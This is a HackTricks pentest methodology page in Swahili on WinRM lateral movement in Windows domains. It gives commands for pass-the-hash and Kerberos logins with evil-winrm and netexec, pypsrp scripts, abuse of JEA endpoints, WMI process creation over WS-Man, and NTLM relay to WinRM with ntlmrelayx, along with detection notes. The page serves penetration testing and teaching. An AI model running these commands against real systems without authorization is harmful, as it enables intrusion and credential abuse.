# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM ni mojawapo ya **lateral movement** transports rahisi zaidi katika mazingira ya Windows kwa sababu hukupa remote shell kupitia **WS-Man/HTTP(S)** bila kuhitaji mbinu za kuunda SMB service. Ikiwa target inafichua **5985/5986** na principal yako inaruhusiwa kutumia remoting, mara nyingi unaweza kusonga kutoka "valid creds" hadi "interactive shell" haraka sana.

Kwa **protocol/service enumeration**, listeners, kuwezesha WinRM, `Invoke-Command`, na matumizi ya generic client, angalia:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Kwa nini operators hupenda WinRM

- Hutumia **HTTP/HTTPS** badala ya SMB/RPC, hivyo mara nyingi hufanya kazi mahali ambapo execution za aina ya PsExec zimezuiwa.
- Kwa **Kerberos**, huepuka kutuma reusable credentials kwa target.
- Hufanya kazi vizuri kutoka kwa tooling za **Windows**, **Linux**, na **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Interactive PowerShell remoting path huzindua **`wsmprovhost.exe`** kwenye target chini ya authenticated user context, jambo ambalo kiutendaji ni tofauti na service-based exec.

## Access model na prerequisites

Kiutendaji, WinRM lateral movement yenye mafanikio hutegemea **mambo matatu**:

1. Target ina **WinRM listener** (`5985`/`5986`) na firewall rules zinazoruhusu access.
2. Akaunti inaweza **authenticate** kwenye endpoint.
3. Akaunti inaruhusiwa **kufungua remoting session**.

Njia za kawaida za kupata access hiyo:

- **Local Administrator** kwenye target.
- Uanachama katika **Remote Management Users** kwenye systems mpya au **WinRMRemoteWMIUsers__** kwenye systems/components ambazo bado zinaheshimu group hiyo.
- Remoting rights za wazi zilizokabidhiwa kupitia local security descriptors / PowerShell remoting ACL changes.

Ikiwa tayari unadhibiti box lenye admin rights, kumbuka unaweza pia **kudeblegate WinRM access bila full admin group membership** kwa kutumia techniques zilizoelezwa hapa:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas muhimu wakati wa lateral movement

- **Kerberos inahitaji hostname/FQDN**. Ukijiunga kwa IP, client kawaida hurudi kwenye **NTLM/Negotiate**.
- Katika mazingira ya **workgroup** au cross-trust edge cases, NTLM mara nyingi huhitaji ama **HTTPS** au target kuongezwa kwenye **TrustedHosts** kwenye client.
- Kwa **local accounts** kupitia Negotiate katika workgroup, UAC remote restrictions zinaweza kuzuia access isipokuwa built-in Administrator account itumike au `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting huweka default kwenye **`HTTP/<host>` SPN**. Katika mazingira ambapo `HTTP/<host>` tayari imesajiliwa kwa service account nyingine, WinRM Kerberos inaweza kushindwa kwa `0x80090322`; tumia port-qualified SPN au badili kwenda **`WSMAN/<host>`** ambapo SPN hiyo ipo.

Ukipata valid credentials wakati wa password spraying, kuzithibitisha kupitia WinRM mara nyingi ndiyo njia ya haraka zaidi ya kuangalia kama zinatoa shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec kwa validation na one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM kwa interactive shells

`evil-winrm` bado ni chaguo rahisi zaidi la interactive kutoka Linux kwa sababu inasaidia **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, uhamishaji wa faili, na kupakia PowerShell/.NET ndani ya memory.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

Wakati default **`HTTP/<host>`** SPN husababisha Kerberos failures, jaribu kuomba/kutumia ticket ya **`WSMAN/<host>`** badala yake. Hii huonekana katika hardened au enterprise setups zisizo za kawaida ambapo **`HTTP/<host>`** tayari imeambatanishwa na account nyingine ya service.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Hii pia ni muhimu baada ya **RBCD / S4U** abuse unapokuwa umeforge au kuomba hasa **WSMAN** service ticket badala ya generic `HTTP` ticket.

### Uthibitishaji unaotegemea certificate

WinRM pia inasaidia **client certificate authentication**, lakini certificate lazima iwe ime-mapped kwenye target kwa **local account**. Kutoka kwa mtazamo wa offensive, hii ni muhimu wakati:

- umeiba/export valid client certificate na private key ambao tayari ume-mapped kwa WinRM;
- umeabuse **AD CS / Pass-the-Certificate** ili kupata certificate kwa principal kisha pivot kwenda kwenye authentication path nyingine;
- unafanya kazi kwenye mazingira ambayo kwa makusudi huepuka password-based remoting.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM ni ya kawaida zaidi kuliko password/hash/Kerberos auth, lakini inapokuwepo inaweza kutoa njia ya **passwordless lateral movement** inayodumu hata baada ya password rotation.

### Python / automation with `pypsrp`

Ikiwa unahitaji automation badala ya operator shell, `pypsrp` inakupa WinRM/PSRP kutoka Python kwa msaada wa **NTLM**, **certificate auth**, **Kerberos**, na **CredSSP**.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
Ikiwa unahitaji udhibiti wa kina zaidi kuliko wrapper ya kiwango cha juu ya `Client`, APIs za kiwango cha chini `WSMan` + `RunspacePool` ni muhimu kwa matatizo mawili ya kawaida ya operator:

- kulazimisha **`WSMAN`** kama huduma/SPN ya Kerberos badala ya matarajio ya default ya `HTTP` yanayotumiwa na wateja wengi wa PowerShell;
- kuunganisha kwenye **non-default PSRP endpoint** kama vile **JEA** / custom session configuration badala ya `Microsoft.PowerShell`.
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Custom PSRP endpoints and JEA matter during lateral movement

Uthibitishaji wa WinRM uliofanikiwa hauimaanishi **daima** kwamba utaingia kwenye endpoint ya kawaida isiyozuiwa ya `Microsoft.PowerShell`. Mazingira yaliyokomaa yanaweza kufichua **custom session configurations** au endpoints za **JEA** zenye ACLs zao na tabia ya run-as.

Ikiwa tayari una code execution kwenye host ya Windows na unataka kuelewa ni surfaces gani za remoting zipo, orodhesha endpoints zilizosajiliwa:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
Wakati endpoint yenye manufaa ipo, lenga hiyo moja kwa moja badala ya shell ya kawaida:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
Madhara ya kivitendo ya ofensivu:

- Endpoint yenye **restricted** bado inaweza kuwa ya kutosha kwa lateral movement ikiwa inaonyesha cmdlets/functions sahihi tu za udhibiti wa huduma, ufikiaji wa faili, uundaji wa mchakato, au utekelezaji wa .NET / amri za nje kiholela.
- Role ya **misconfigured JEA** ni yenye thamani sana hasa inapofichua commands hatari kama `Start-Process`, wildcards pana, writable providers, au custom proxy functions zinazokuruhusu kutoka nje ya vizuizi vilivyokusudiwa.
- Endpoints zinazotumia **RunAs virtual accounts** au **gMSAs** hubadilisha effective security context ya commands unazotekeleza. Hasa, endpoint inayotumia gMSA inaweza kutoa **network identity on the second hop** hata wakati session ya kawaida ya WinRM ingekumbana na classic delegation problem.

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` imejengwa ndani na ni muhimu unapohitaji **native WinRM command execution** bila kufungua interactive PowerShell remoting session:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Bendera mbili ni rahisi kusahau na zina umuhimu katika matumizi ya vitendo:

- `/noprofile` mara nyingi inahitajika wakati principal wa mbali **sio** local administrator.
- `/allowdelegate` huwezesha remote shell kutumia credentials zako dhidi ya **third host** (kwa mfano, wakati command inahitaji `\\fileserver\share`).
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
Kiutendaji, `winrs.exe` kwa kawaida husababisha mnyororo wa mchakato wa mbali unaofanana na:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Hili ni jambo la kukumbuka kwa sababu linatofautiana na service-based exec na pia na interactive PSRP sessions.

### `winrm.cmd` / WS-Man COM badala ya PowerShell remoting

Unaweza pia ku-execute kupitia **WinRM transport** bila `Enter-PSSession` kwa kuita WMI classes juu ya WS-Man. Hii huweka transport kama WinRM ilhali primitive ya remote execution inakuwa **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Njia hiyo ni muhimu wakati:

- PowerShell logging inafuatiliwa kwa ukaribu sana.
- Unataka **WinRM transport** lakini si classic PS remoting workflow.
- Unajenga au unatumia custom tooling kuzunguka object ya **`WSMan.Automation`** COM.

## NTLM relay hadi WinRM (WS-Man)

Wakati SMB relay imezuiwa na signing na LDAP relay imewekewa vikwazo, **WS-Man/WinRM** bado inaweza kuwa target ya relay inayovutia. `ntlmrelayx.py` ya kisasa inajumuisha **WinRM relay servers** na inaweza kufanya relay hadi targets za **`wsman://`** au **`winrms://`**.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Vidokezo viwili vya vitendo:

- Relay ni muhimu zaidi wakati lengo linakubali **NTLM** na principal iliyorelaiwa inaruhusiwa kutumia WinRM.
- Msimbo wa hivi karibuni wa Impacket hushughulikia mahsusi maombi ya **`WSMANIDENTIFY: unauthenticated`** ili probe za aina ya `Test-WSMan` zisiharibu mtiririko wa relay.

Kwa constraints za multi-hop baada ya kufika kwenye session ya kwanza ya WinRM, angalia:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC na maelezo ya detection

- **Interactive PowerShell remoting** kwa kawaida huunda **`wsmprovhost.exe`** kwenye lengo.
- **`winrs.exe`** kwa kawaida huunda **`winrshost.exe`** kisha child process iliyoombwa.
- Custom **JEA** endpoints zinaweza kutekeleza actions kama **`WinRM_VA_*`** virtual accounts au kama **gMSA** iliyosanidiwa, jambo linalobadilisha telemetry na tabia ya second-hop ikilinganishwa na normal user-context shell.
- Tarajia telemetry ya **network logon**, matukio ya WinRM service, na PowerShell operational/script-block logging ikiwa unatumia PSRP badala ya raw `cmd.exe`.
- Ikiwa unahitaji command moja tu, `winrs.exe` au one-shot WinRM execution inaweza kuwa tulivu zaidi kuliko interactive remoting session ya muda mrefu.
- Ikiwa Kerberos inapatikana, pendelea **FQDN + Kerberos** badala ya IP + NTLM ili kupunguza matatizo ya trust na mabadiliko yasiyo ya lazima ya upande wa mteja kwenye `TrustedHosts`.

## Marejeo

- [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [pypsrp README](https://github.com/jborean93/pypsrp)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
